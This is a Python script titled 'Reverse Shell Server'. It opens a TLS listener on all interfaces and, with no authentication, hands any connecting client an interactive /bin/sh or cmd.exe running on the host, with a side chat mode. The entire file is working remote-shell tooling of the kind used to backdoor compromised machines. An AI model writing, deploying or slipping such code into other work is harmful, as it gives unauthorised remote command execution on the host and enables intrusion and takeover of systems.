import socket
import ssl
import argparse
import json
import threading
import sys
import platform
import subprocess
from math import ceil
from datetime import datetime


parser = argparse.ArgumentParser(description="Reverse Shell Server")
parser.add_argument("--ip", required=False, default="0.0.0.0",
                    help="IP address to host the reverse shell server. If not specified will use address 0.0.0.0.")
parser.add_argument("--port", required=False, default=8081,
                    help="PORT to listen on. If not specified port 8081 will be used.")
parser.add_argument("--cafile", required=False, default="./cert.pem",
                    help="The CA Certificate file for the server Caution:\
                            If not given ./cert.pem will be used as default assuming it exists")
parser.add_argument("--private-key", required=False, default="./private.key", help="The Private Key for the server. If not mentioned ./private.key file will be used assuming it exists.")

parser.add_argument("--nocolors", action=argparse.BooleanOptionalAction)


class Buffer:
    def __init__(self, buff_size: int):
        self.buffer_size = buff_size

    def to_buffers(self, data: str) -> [[str]]:
        buffer = ['\0']*self.buffer_size
        res = []

        if len(data) < len(buffer):
            for i in range(len(data)):
                buffer[i] = data[i]

            res.append(buffer)
            return res
        else:
            n = ceil(len(data) / self.buffer_size)
            idx = 0
            for i in range(n):
                buffer = ['\0']*self.buffer_size
                idx = i * self.buffer_size
                for (i, e) in enumerate(data[idx:idx+self.buffer_size]):
                    buffer[i] = e
                res.append(buffer)
            return res


class Server:
    def __init__(self, ip: str, port: int, cert_file: str, key_file: str, colorable: None | bool):
        self.ip = ip
        self.port = port
        self.colorable = colorable
        self.bufferRW = Buffer(64)
        self.welcome_message = "\nHello There!\nOptions:\n1. Access Shell\n2. Chat\n"
        self.std_msg = {
                "data": "",
                "time": "",
        }
        self.linux_shell = "/bin/sh"
        self.windows_shell = "cmd.exe"
        self.time_color = "\033[92;49m"
        self.reset_color = "\033[0m"

        context = self.create_context(cert_file, key_file)
        self.serve(context)

    def create_context(self, cert_file: str, key_file: str):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        return context

    def active_receiver(self, conn, once=False, writer=None):
        buff = ""

        while msg := conn.recv(64):
            try:
                msg_d = msg.decode('utf-8')
                msg_d = msg_d.split("\0")[0]
                json_msg = json.loads(buff + msg_d)
            except:
                msg_d = msg.decode('utf-8')
                msg_d = msg_d.split("\0")[0]
                buff += msg_d
                continue

            if once:
                return json_msg
            message = json_msg["data"]
            time = json_msg["time"]
            if not writer:
                if message != "\n":
                    if time:
                        message = (self.time_color if not self.colorable else "") + time + (self.reset_color if not self.colorable else "") + " :" + message
                    sys.stdout.write(message)
                    sys.stdout.flush()
            else:
                writer.stdin.write(message)
            buff = ""

        self.close_all_connections()
        print("connection closed")

    def send_msg(self, conn, msg, include_time=True):
        whole_msg = self.std_msg.copy()
        whole_msg["data"] = msg
        if include_time:
            current_time = datetime.now()
            ctime = datetime.strftime(current_time, "%H:%M:%S")
            whole_msg["time"] = ctime
        json_msg = json.dumps(whole_msg)
        buffers = self.bufferRW.to_buffers(json_msg)

        for buff in buffers:
            buff_str = ''.join(buff)
            conn.send(buff_str.encode('utf-8'))

    def chat(self, conn):
        thread = threading.Thread(target=self.active_receiver, args=(conn,))
        thread.start()
        while True:
            try:
                user_input = input()
            except KeyboardInterrupt:
                print("Closing connection...")
                try:
                    self.close_all_connections()
                except:
                    pass
                sys.exit(0)

            self.send_msg(conn, user_input + "\n")

        thread.join()

    def active_stdout(self, process, conn):
        while True:
            output = process.stdout.readline()
            if output == "" and (process.poll() is not None):
                return
            else:
                self.send_msg(conn, output)

    def shell(self, conn):
        system = platform.system()

        if system == "Linux":
            proc = subprocess.Popen([self.linux_shell],
                                    stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    text=True,
                                    bufsize=1)
        elif system == "Windows":
            proc = subprocess.Popen([self.windows_shell],
                                    stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    text=True,
                                    bufsize=1)
        else:
            return

        thread = threading.Thread(target=self.active_stdout, args=(proc, conn,))
        thread.daemon = True
        thread.start()

        thread1 = threading.Thread(target=self.active_receiver, args=(conn, False, proc,))
        thread1.start()

        proc.wait()
        thread.join()
        thread1.join()

    def close_all_connections(self):
        try:
            self.conn.close()
            self.ss.close()
            self.s.close()
        except:
            return

    def serve(self, context):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.s:
            self.s.bind((self.ip, self.port))
            self.s.listen(1)
            print("[+] Server Up and Running\n[_]Listening for Connections...")

            with context.wrap_socket(self.s, server_side=True) as self.ss:
                self.conn, addr = self.ss.accept()
                print("Connection received from", addr[0])

                while True:
                    self.send_msg(self.conn, self.welcome_message, include_time=False)
                    msg = self.active_receiver(self.conn, once=True)["data"]
                    try:
                        choice = int(msg)
                    except:
                        self.send_msg(self.conn, "Expected an integer (1 or 2)")
                        continue

                    if choice == 1 or choice == 2:
                        if choice == 1:
                            self.shell(self.conn)
                        else:
                            self.chat(self.conn)
                    else:
                        self.send_msg(self.conn, "Expected an integer (1 or 2)")


if __name__ == "__main__":
    args = parser.parse_args()
    ip = args.ip
    port = int(args.port)
    cafile = args.cafile
    private_key = args.private_key
    colorable = args.nocolors

    Server(ip, port, cafile, private_key, colorable)
